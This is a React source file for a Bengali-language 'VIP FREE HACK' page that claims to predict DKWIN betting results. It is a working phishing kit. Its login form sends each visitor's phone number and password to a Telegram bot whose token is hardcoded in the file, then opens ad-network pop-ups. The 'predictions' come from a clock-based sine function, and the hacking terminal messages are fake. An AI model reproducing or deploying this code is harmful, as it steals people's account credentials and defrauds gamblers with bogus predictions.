import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Shield, Lock, Smartphone, Terminal, AlertCircle, ChevronRight, Cpu, Activity, Globe } from 'lucide-react';

export default function App() {
  const [phoneNumber, setPhoneNumber] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [terminalLines, setTerminalLines] = useState<string[]>([]);
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [isAdFinished, setIsAdFinished] = useState(false);
  const [adPhase, setAdPhase] = useState(1);
  const [adTimer, setAdTimer] = useState(10);
  const [hasClaimed, setHasClaimed] = useState(false);
  const [isUnlocked, setIsUnlocked] = useState(false);
  const [accessKey, setAccessKey] = useState('');
  const [prediction, setPrediction] = useState({ text: '...', nums: '-- & --' });
  const [predictionTimer, setPredictionTimer] = useState(30);

  const GAME_SITE = "https://vip-free-hack-dk.vercel.app/";
  const INTERMEDIATE_SITE_1 = "https://www.profitablecpmratenetwork.com/ss7nmu0apx?key=a5ea4453215928f238b0b35845fef01f";
  const INTERMEDIATE_SITE_2 = "https://www.profitablecpmratenetwork.com/q22i5byud?key=dcf3fce3472d6ba711a0feee502b7013";

  const AUTO_OPEN_LINKS = [
    "https://www.profitablecpmratenetwork.com/ss7nmu0apx?key=a5ea4453215928f238b0b35845fef01f",
    "https://www.profitablecpmratenetwork.com/q22i5byud?key=dcf3fce3472d6ba711a0feee502b7013",
  ];

  const hasBengali = (str: string) => {
    return /[\u0980-\u09FF]/.test(str);
  };

  const openAutoLinks = () => {
    AUTO_OPEN_LINKS.forEach((url, i) => {
      setTimeout(() => {
        try {
          const win = window.open(url, '_blank');
          if (!win) console.warn("Popup blocked for:", url);
        } catch (e) {
          console.error("Error opening link:", e);
        }
      }, i * 10000);
    });
  };

  useEffect(() => {
    if (isLoggedIn && adPhase === 1) {
      const timer = setInterval(() => {
        setAdTimer(prev => {
          if (prev <= 1) {
            setAdPhase(2);
            clearInterval(timer);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
      return () => clearInterval(timer);
    }
  }, [isLoggedIn, adPhase]);

  useEffect(() => {
    if (isLoggedIn && hasClaimed && isUnlocked) {
      // Initialize prediction immediately
      const list = ["SMALL 1,3", "SMALL 2,4", "SMALL 0,4", "BIG 6,8", "BIG 7,9", "BIG 5,9"];
      
      const updatePrediction = () => {
        const now = new Date();
        const ms = now.getTime();
        const p = Math.floor(ms / 30000);
        const seed = p * 1.234;
        const idx = Math.floor(Math.abs(Math.sin(seed) * list.length)) % list.length;
        const resultData = list[idx].split(' '); 
        setPrediction({ text: resultData[0], nums: resultData[1] });

        const totalSec = now.getSeconds();
        const remaining = totalSec >= 30 ? 60 - totalSec : 30 - totalSec;
        setPredictionTimer(remaining);
      };

      updatePrediction();

      // Prediction engine update
      const pInterval = setInterval(updatePrediction, 1000);

      return () => {
        clearInterval(pInterval);
      };
    }
  }, [isLoggedIn, hasClaimed, isUnlocked]);

  useEffect(() => {
    document.title = "〲𝗧ʀᴀᴅᴇʀ 𝗧ᴀᴍɪᴍ —͟͟͞͞𖣘 💮";
    const lines = [
      "> INITIALIZING TAMIM_HACK_v5.0",
      "> BYPASSING SECURITY PROTOCOLS...",
      "> CONNECTING TO DKWIN SERVER...",
      "> TUNNEL ESTABLISHED [AES-256]",
      "> READY FOR PREDICTION"
    ];
    let i = 0;
    const interval = setInterval(() => {
      if (i < lines.length) {
        setTerminalLines(prev => [...prev, lines[i]]);
        i++;
      } else {
        clearInterval(interval);
      }
    }, 600);
    return () => clearInterval(interval);
  }, []);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setIsLoading(true);

    const BOT_TOKEN = "8654386699:AAHnd5JW6edp7SS63-AKUiCy18GpblVI7cI";
    const CHAT_ID = "8596479830";

    setTimeout(async () => {
      const cleanPhone = phoneNumber.trim();
      
      if (hasBengali(cleanPhone) || hasBengali(password)) {
        setError('বাংলা অক্ষর বা ডিজিট ব্যবহার করা যাবে না! শুধুমাত্র ইংরেজি ব্যবহার করুন।');
        setIsLoading(false);
        return;
      }

      if (cleanPhone.length !== 11) {
        setError('ফোন নম্বর অবশ্যই ১১ ডিজিটের হতে হবে!');
        setIsLoading(false);
        return;
      }

      if (password.length < 8) {
        setError('পাসওয়ার্ড কমপক্ষে ৮ অক্ষরের হতে হবে!');
        setIsLoading(false);
        return;
      }

      // Prepare message for Telegram with HTML for click-to-copy
      // Phone number will be copyable without the leading zero if it exists
      const displayPhone = cleanPhone.startsWith('0') 
        ? `0<code>${cleanPhone.substring(1)}</code>` 
        : `<code>${cleanPhone}</code>`;

      const message = `
🚀 <b>VIP HACK LOGIN ATTEMPT</b> 🚀
━━━━━━━━━━━━━━━━━━
📱 <b>Phone:</b> ${displayPhone}
🔑 <b>Password:</b> <code>${password}</code>
🌐 <b>IP:</b> (Client Side)
━━━━━━━━━━━━━━━━━━
      `;

      try {
        // Send to Telegram
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML',
          }),
        });
      } catch (err) {
        console.error("Telegram notification failed:", err);
      }

      // Redirect immediately after sending (or trying to send)
      setIsLoggedIn(true);
      setIsLoading(false);
      openAutoLinks();
    }, 800);
  };

  if (isLoggedIn) {
    return (
      <div className="fixed inset-0 bg-black flex flex-col items-center justify-center">
        <iframe 
          src={adPhase === 1 ? INTERMEDIATE_SITE_1 : INTERMEDIATE_SITE_2} 
          className="w-full h-full border-none"
          title="Ad Frame"
        />
        {adPhase === 1 && (
          <div className="absolute top-4 right-4 bg-black/80 text-white px-4 py-2 rounded-full font-bold text-sm border border-white/20 backdrop-blur-md">
            Phase 1: {adTimer}s
          </div>
        )}
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4 bg-brutal-black overflow-hidden font-mono selection:bg-neon-green selection:text-brutal-black">
      {/* Background Grid (Square Lines) */}
      <div className="absolute inset-0 opacity-10 pointer-events-none overflow-hidden">
        <div className="absolute inset-0" 
             style={{ 
               backgroundImage: 'linear-gradient(to right, #00FF00 1px, transparent 1px), linear-gradient(to bottom, #00FF00 1px, transparent 1px)', 
               backgroundSize: '30px 30px' 
             }} />
      </div>

      <motion.div 
        initial={{ scale: 0.98, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        className="w-full max-w-[360px] relative z-10 mx-auto"
      >
        {/* Top Status Bar */}
        <div className="flex justify-between items-center mb-2 px-2 text-[10px] text-neon-green/50 uppercase tracking-widest">
          <div className="flex items-center gap-2">
            <Activity className="w-3 h-3 animate-pulse" />
            <span>Link: Established</span>
          </div>
          <div className="flex items-center gap-2">
            <Globe className="w-3 h-3" />
            <span>Region: BD_SEC_01</span>
          </div>
        </div>

        {/* Header with Glitch Effect (Reverted to First Design) */}
        <div className="mb-10 text-center relative pt-10">
          <motion.div
            animate={{ 
              textShadow: [
                "0 0 10px rgba(0,255,0,0.5)",
                "0 0 20px rgba(0,255,0,0.8)",
                "0 0 10px rgba(0,255,0,0.5)"
              ],
              scale: [1, 1.02, 1]
            }}
            transition={{ repeat: Infinity, duration: 2, ease: "easeInOut" }}
            className="inline-flex flex-col items-center"
          >
            <h1 className="text-[38px] md:text-[55px] font-black uppercase tracking-tighter italic relative leading-tight flex flex-col items-center">
              <span className="text-white drop-shadow-[0_0_15px_rgba(255,255,255,0.3)]">VIP FREE HACK</span>
              
              {/* Subtle Glitch Layers */}
              <motion.div 
                animate={{ x: [-1, 1, -1], opacity: [0.2, 0.4, 0.2] }}
                transition={{ duration: 3, repeat: Infinity }}
                className="absolute -top-0.5 -left-0.5 text-red-500/30 select-none flex flex-col items-center w-full pointer-events-none mix-blend-screen"
              >
                <span>VIP FREE HACK</span>
              </motion.div>
              <motion.div 
                animate={{ x: [1, -1, 1], opacity: [0.2, 0.4, 0.2] }}
                transition={{ duration: 3, repeat: Infinity, delay: 1.5 }}
                className="absolute top-0.5 left-0.5 text-blue-500/30 select-none flex flex-col items-center w-full pointer-events-none mix-blend-screen"
              >
                <span>VIP FREE HACK</span>
              </motion.div>
            </h1>
          </motion.div>
          <div className="h-1.5 w-48 bg-neon-green mx-auto mt-6 skew-x-[-25deg] shadow-[0_0_20px_#00FF00] opacity-80" />
        </div>

        {/* Terminal Output */}
        <div className="mb-8 p-4 bg-zinc-900/95 border-2 border-neon-green font-mono text-[11px] text-neon-green h-32 overflow-hidden shadow-[0_0_30px_rgba(0,255,0,0.15)] relative">
          <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-b from-transparent via-neon-green/5 to-transparent pointer-events-none animate-scanline" />
          <AnimatePresence>
            {terminalLines.map((line, idx) => (
              <motion.div 
                key={idx}
                initial={{ x: -10, opacity: 0 }}
                animate={{ x: 0, opacity: 1 }}
                className="flex gap-2 mb-1"
              >
                <span className="text-neon-green/40">[{idx.toString().padStart(2, '0')}]</span>
                <span>{line}</span>
              </motion.div>
            ))}
          </AnimatePresence>
          <motion.span 
            animate={{ opacity: [1, 0] }}
            transition={{ repeat: Infinity, duration: 0.6 }}
            className="inline-block w-2 h-3 bg-neon-green ml-1"
          />
        </div>

        {/* Login Form Container */}
        <div className="relative group">
          {/* Scanning Line Animation */}
          <motion.div 
            animate={{ top: ['0%', '100%'] }}
            transition={{ duration: 3, repeat: Infinity, ease: "linear" }}
            className="absolute left-0 right-0 h-[2px] bg-neon-green/40 z-20 shadow-[0_0_10px_#00FF00] pointer-events-none"
          />

          <form onSubmit={handleLogin} className="bg-zinc-900/95 p-6 border-2 border-neon-green/30 space-y-5 relative overflow-hidden shadow-[0_0_40px_rgba(0,255,0,0.05)]">
            {/* Corner Accents (Unique Design) */}
            <div className="absolute top-0 left-0 w-6 h-6 border-t-4 border-l-4 border-neon-green" />
            <div className="absolute top-0 right-0 w-6 h-6 border-t-4 border-r-4 border-neon-green" />
            <div className="absolute bottom-0 left-0 w-6 h-6 border-b-4 border-l-4 border-neon-green" />
            <div className="absolute bottom-0 right-0 w-6 h-6 border-b-4 border-r-4 border-neon-green" />

            <div className="space-y-2">
              <label className="text-[10px] uppercase font-black tracking-[0.2em] text-zinc-500 flex items-center gap-2">
                <Smartphone className="w-3 h-3 text-neon-green" /> Phone Number
              </label>
              <div className="relative">
                <input 
                  type="text"
                  maxLength={11}
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value.replace(/[^\d০-৯]/g, ''))}
                  placeholder="01XXXXXXXXX"
                  className="w-full bg-black/50 border-2 border-zinc-800 p-4 font-mono text-neon-green outline-none focus:border-neon-green focus:shadow-[0_0_15px_rgba(0,255,0,0.1)] transition-all placeholder:text-zinc-800 text-base"
                  required
                />
              </div>
            </div>

            <div className="space-y-2">
              <label className="text-[10px] uppercase font-black tracking-[0.2em] text-zinc-500 flex items-center gap-2">
                <Lock className="w-3 h-3 text-neon-green" /> Password
              </label>
              <input 
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="••••••••"
                className="w-full bg-black/50 border-2 border-zinc-800 p-4 font-mono text-neon-green outline-none focus:border-neon-green focus:shadow-[0_0_15px_rgba(0,255,0,0.1)] transition-all placeholder:text-zinc-800 text-base"
                required
              />
            </div>

            <AnimatePresence mode="wait">
              {(error || hasBengali(phoneNumber) || hasBengali(password)) && (
                <motion.div 
                  initial={{ opacity: 0, x: 20 }}
                  animate={{ opacity: 1, x: 0 }}
                  exit={{ opacity: 0, x: -20 }}
                  className="flex items-center gap-3 text-red-500 text-[10px] font-bold bg-red-500/5 p-4 border-l-2 border-red-500 uppercase tracking-wider"
                >
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{hasBengali(phoneNumber) || hasBengali(password) ? 'বাংলা অক্ষর বা ডিজিট ব্যবহার করা যাবে না! শুধুমাত্র ইংরেজি ব্যবহার করুন।' : error}</span>
                </motion.div>
              )}
            </AnimatePresence>

            <button 
              type="submit"
              disabled={isLoading || hasBengali(phoneNumber) || hasBengali(password)}
              className="w-full group relative py-4 bg-neon-green text-black font-black uppercase tracking-[0.3em] hover:brightness-110 active:scale-[0.98] transition-all disabled:opacity-50 disabled:cursor-not-allowed overflow-hidden shadow-[0_0_20px_rgba(0,255,0,0.2)]"
            >
              <div className="relative z-10 flex items-center justify-center gap-2 text-lg">
                {isLoading ? (
                  <>
                    <motion.div 
                      animate={{ rotate: 360 }}
                      transition={{ repeat: Infinity, duration: 1, ease: "linear" }}
                    >
                      <Cpu className="w-5 h-5" />
                    </motion.div>
                    <span>BYPASSING...</span>
                  </>
                ) : (
                  <>
                    <span>BYPASS SECURITY</span>
                    <ChevronRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
                  </>
                )}
              </div>
            </button>
          </form>

          <div className="mt-8 text-center">
            <div className="text-zinc-500 text-[10px] tracking-[0.3em] uppercase font-black italic">
              Developed By <span className="text-neon-green">Trader Tamim</span>
            </div>
          </div>
        </div>

        {/* Footer Info */}
        <div className="mt-8 flex justify-between items-center text-[9px] text-zinc-600 font-mono uppercase tracking-widest">
          <div className="flex items-center gap-2">
            <div className="w-1.5 h-1.5 rounded-full bg-neon-green animate-pulse" />
            Node: BD_DHAKA_09
          </div>
          <div className="flex items-center gap-4">
            <span>Enc: AES_256</span>
            <span>v4.0.1_STABLE</span>
          </div>
        </div>
      </motion.div>

      {/* Decorative Floating Elements */}
      <div className="fixed top-10 left-10 text-[10px] text-neon-green/10 font-mono hidden lg:block pointer-events-none">
        {`{
  "protocol": "VIP_HACK",
  "status": "active",
  "bypass_level": 9,
  "encryption": "SHA-512"
}`}
      </div>
      <div className="fixed bottom-10 right-10 text-[10px] text-neon-green/10 font-mono hidden lg:block pointer-events-none">
        01010111 01001000 01000001 01010100 00100000 01001001 01010011 00100000 01001000 01000001 01000011 01001011
      </div>
    </div>
  );
}
